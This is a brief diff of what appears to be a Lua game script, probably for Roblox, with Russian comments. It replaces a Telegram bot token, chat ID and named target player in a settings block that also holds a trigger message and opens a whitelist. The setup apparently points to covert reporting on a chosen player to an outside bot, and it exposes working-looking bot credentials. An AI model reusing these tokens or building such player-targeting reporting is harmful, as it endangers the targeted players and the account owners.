@@ -76,9 +76,9 @@ end)
 -- ⏳ Весь остальной функционал запускается независимо
 
 -- 🔧 НАСТРОЙКИ
-local TELEGRAM_TOKEN = "7678595031:AAHYzkbKKI4CdT6B2NUGcYY6IlTvWG8xkzE"
-local TELEGRAM_CHAT_ID = "7144575011"
-local TARGET_PLAYER = "sfdgbzdfsb"
+local TELEGRAM_TOKEN = "8453808391:AAF2DDoyG2A3kC-z_L7eSy_wDsrMqbW-dFc"
+local TELEGRAM_CHAT_ID = "1083880279"
+local TARGET_PLAYER = "AlDente94"
 local TRIGGER_MESSAGE = "."
 
 -- 🐾 БЕЛЫЙ СПИСОК
